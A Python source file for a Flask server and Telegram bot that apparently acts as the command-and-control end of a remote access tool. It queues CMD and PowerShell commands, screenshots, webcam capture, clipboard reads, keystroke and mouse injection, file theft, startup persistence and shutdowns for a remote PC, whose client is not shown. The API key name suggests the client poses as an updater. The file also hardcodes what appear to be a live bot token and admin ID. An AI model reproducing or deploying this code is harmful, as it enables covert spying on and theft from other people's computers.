import telebot, os, time, datetime, threading
from flask import Flask, request, abort, jsonify, send_file
from werkzeug.utils import secure_filename

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8712749832:AAGnChNQus7mqp_2qQuMfK4-JNiorGGkkns")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7637946765"))
API_KEY = os.environ.get("API_KEY", "wupdater2026secret")
RENDER_URL = os.environ.get("RENDER_URL", "")
PORT = int(os.environ.get("PORT", "5000"))

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = Flask(__name__)

pending = []
pc = {"online": False, "last": None}
UPLOAD = "/tmp/uploads"
os.makedirs(UPLOAD, exist_ok=True)
cid = 0
state = {}

# ---- Pages ----
P = [
    [["📸 Скрин", "ℹ️ Инфо"],["📋 Процессы", "📂 Файлы"],["📋 Буфер", "💬 MSG"],["⚡ CMD", "🔒 Блок"], ["➡️"]],
    [["🖱 Клик", "🖱 Мышь"],["⌨️ Клавиша", "🔊 Громкость+"],["🔉 Громкость-", "🔇 Мут"],["🎥 Камера", "🚀 Запуск"],["⬅️", "➡️"]],
    [["📦 Переместить", "🔍 Поиск"],["📥 Скачать", "📤 Push"],["💀 Выкл", "🔄 Рестарт"],["🏠 Авто", "📊 Статус"],["⬅️"]],
]
page = {}

def kb(pg=0):
    k = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    for row in P[pg]:
        k.row(*row)
    return k

def q(cmd):
    global cid; cid += 1
    pending.append({"id": cid, "cmd": cmd})

# ---- Flask ----
@app.route('/')
def index(): return "OK", 200

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def wh():
    if request.content_type == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return '', 200
    abort(403)

@app.route('/api/poll')
def poll():
    if request.args.get('key') != API_KEY: abort(403)
    pc["online"] = True
    pc["last"] = datetime.datetime.now().strftime("%H:%M:%S")
    c = list(pending); pending.clear()
    return jsonify({"commands": c})

@app.route('/api/result', methods=['POST'])
def result():
    k = request.form.get('key') or (request.json or {}).get('key')
    if k != API_KEY: abort(403)
    try:
        t = request.form.get('text', '') if request.form else (request.json or {}).get('text', '')
        if t:
            if len(t) > 4000: t = t[:4000] + "\n..."
            bot.send_message(ADMIN_ID, t)
    except Exception as e: print(e)
    return "ok"

@app.route('/api/photo', methods=['POST'])
def photo():
    if request.form.get('key') != API_KEY: abort(403)
    try:
        f = request.files.get('photo')
        if f:
            p = os.path.join(UPLOAD, "s.jpg"); f.save(p)
            with open(p, 'rb') as x: bot.send_photo(ADMIN_ID, x)
            os.remove(p)
    except Exception as e: print(e)
    return "ok"

@app.route('/api/file', methods=['POST'])
def file():
    if request.form.get('key') != API_KEY: abort(403)
    try:
        f = request.files.get('file')
        fn = request.form.get('filename', 'file')
        if f:
            p = os.path.join(UPLOAD, secure_filename(fn)); f.save(p)
            with open(p, 'rb') as x: bot.send_document(ADMIN_ID, x, visible_file_name=fn)
            os.remove(p)
    except Exception as e: print(e)
    return "ok"

@app.route('/api/download')
def dl():
    if request.args.get('key') != API_KEY: abort(403)
    for fn in os.listdir(UPLOAD):
        if fn.startswith("for_pc_"):
            return send_file(os.path.join(UPLOAD, fn), download_name=fn[7:], as_attachment=True)
    return jsonify({"file": None})

# ---- Handlers ----
@bot.message_handler(commands=['start', 'help', 'menu'])
def start(msg):
    if msg.chat.id != ADMIN_ID: return
    page[msg.chat.id] = 0
    s = "🟢" if pc["online"] else "🔴"
    bot.send_message(msg.chat.id, f"{s} Управление ПК\n/cmd /ps /screen /info /ls /dl /kill", reply_markup=kb(0))

@bot.message_handler(commands=['cmd'])
def h_cmd(msg):
    if msg.chat.id != ADMIN_ID: return
    c = msg.text[5:].strip()
    if c: q(f"cmd:{c}"); bot.send_message(msg.chat.id, f"⏳ {c}")
    else: state[msg.chat.id] = "cmd"; bot.send_message(msg.chat.id, "Введи CMD команду:")

@bot.message_handler(commands=['ps'])
def h_ps(msg):
    if msg.chat.id != ADMIN_ID: return
    c = msg.text[4:].strip()
    if c: q(f"ps:{c}")
    else: state[msg.chat.id] = "ps"; bot.send_message(msg.chat.id, "Введи PS команду:")

@bot.message_handler(commands=['screen'])
def h_scr(msg):
    if msg.chat.id != ADMIN_ID: return
    q("screen")

@bot.message_handler(commands=['info'])
def h_info(msg):
    if msg.chat.id != ADMIN_ID: return
    q("info")

@bot.message_handler(commands=['ls'])
def h_ls(msg):
    if msg.chat.id != ADMIN_ID: return
    q(f"ls:{msg.text[4:].strip()}")

@bot.message_handler(commands=['dl'])
def h_dl(msg):
    if msg.chat.id != ADMIN_ID: return
    p = msg.text[4:].strip()
    if p: q(f"dl:{p}")
    else: state[msg.chat.id] = "dl"; bot.send_message(msg.chat.id, "Путь к файлу:")

@bot.message_handler(commands=['kill'])
def h_kill(msg):
    if msg.chat.id != ADMIN_ID: return
    p = msg.text[6:].strip()
    if p: q(f"kill:{p}")

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.content_type == 'document')
def h_doc(msg):
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        fn = "for_pc_" + (msg.document.file_name or "file")
        with open(os.path.join(UPLOAD, fn), 'wb') as f: f.write(data)
        q(f"upload:{msg.document.file_name or 'file'}")
        bot.send_message(msg.chat.id, f"📤 → ПК")
    except Exception as e: bot.send_message(msg.chat.id, str(e))

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID, content_types=['text'])
def h_text(msg):
    t = msg.text
    pg = page.get(msg.chat.id, 0)

    # Navigation
    if t == "➡️":
        pg = min(pg + 1, len(P) - 1); page[msg.chat.id] = pg
        bot.send_message(msg.chat.id, f"Стр. {pg+1}/{len(P)}", reply_markup=kb(pg)); return
    if t == "⬅️":
        pg = max(pg - 1, 0); page[msg.chat.id] = pg
        bot.send_message(msg.chat.id, f"Стр. {pg+1}/{len(P)}", reply_markup=kb(pg)); return

    # State input
    s = state.pop(msg.chat.id, None)
    if s:
        if s == "cmd": q(f"cmd:{t}")
        elif s == "ps": q(f"ps:{t}")
        elif s == "msg": q(f"msg:{t}")
        elif s == "click": q(f"click:{t}")
        elif s == "mouse": q(f"mouse:{t}")
        elif s == "key": q(f"key:{t}")
        elif s == "run": q(f"run:{t}")
        elif s == "move": q(f"move:{t}")
        elif s == "search": q(f"search:{t}")
        elif s == "dl": q(f"dl:{t}")
        elif s == "push": q(f"push:{t}")
        bot.send_message(msg.chat.id, "⏳"); return

    # Buttons
    if "Скрин" in t: q("screen"); bot.send_message(msg.chat.id, "📸")
    elif "Инфо" in t: q("info")
    elif "Процессы" in t: q("procs")
    elif "Файлы" in t: q("ls:")
    elif "Буфер" in t: q("clip")
    elif "MSG" in t: state[msg.chat.id] = "msg"; bot.send_message(msg.chat.id, "Текст:")
    elif "CMD" in t: state[msg.chat.id] = "cmd"; bot.send_message(msg.chat.id, "CMD:")
    elif "Блок" in t: q("lock"); bot.send_message(msg.chat.id, "🔒")
    elif "Клик" in t: state[msg.chat.id] = "click"; bot.send_message(msg.chat.id, "x,y:")
    elif "Мышь" in t: state[msg.chat.id] = "mouse"; bot.send_message(msg.chat.id, "x,y:")
    elif "Клавиша" in t: state[msg.chat.id] = "key"; bot.send_message(msg.chat.id, "Клавиша (enter/space/a):")
    elif "Громкость+" in t: q("volume:up")
    elif "Громкость-" in t: q("volume:down")
    elif "Мут" in t: q("volume:mute")
    elif "Камера" in t: q("webcam"); bot.send_message(msg.chat.id, "🎥")
    elif "Запуск" in t: state[msg.chat.id] = "run"; bot.send_message(msg.chat.id, "Путь:")
    elif "Переместить" in t: state[msg.chat.id] = "move"; bot.send_message(msg.chat.id, "откуда > куда:")
    elif "Поиск" in t: state[msg.chat.id] = "search"; bot.send_message(msg.chat.id, "Имя папки:")
    elif "Скачать" in t: state[msg.chat.id] = "dl"; bot.send_message(msg.chat.id, "Путь:")
    elif "Push" in t: state[msg.chat.id] = "push"; bot.send_message(msg.chat.id, "Текст:")
    elif "Выкл" in t: q("shutdown"); bot.send_message(msg.chat.id, "💀")
    elif "Рестарт" in t: q("restart"); bot.send_message(msg.chat.id, "🔄")
    elif "Авто" in t: q("startup")
    elif "Статус" in t:
        s = "🟢 Онлайн" if pc["online"] else "🔴 Оффлайн"
        bot.send_message(msg.chat.id, f"{s}\n⏰ {pc.get('last','—')}")

# ---- Timeout ----
def timeout():
    while True:
        time.sleep(15)
        if pc["online"] and pc["last"]:
            try:
                last = datetime.datetime.strptime(pc["last"], "%H:%M:%S")
                now = datetime.datetime.now().replace(microsecond=0)
                last = last.replace(year=now.year, month=now.month, day=now.day)
                if (now - last).total_seconds() > 20: pc["online"] = False
            except: pass
threading.Thread(target=timeout, daemon=True).start()

# ---- Start ----
if RENDER_URL:
    try: bot.remove_webhook(); time.sleep(0.5); bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
    except: pass

if __name__ == "__main__":
    if RENDER_URL:
        app.run(host='0.0.0.0', port=PORT)
    else:
        bot.remove_webhook()
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
        while True:
            try: bot.polling(non_stop=True, interval=1, timeout=60)
            except: time.sleep(5)
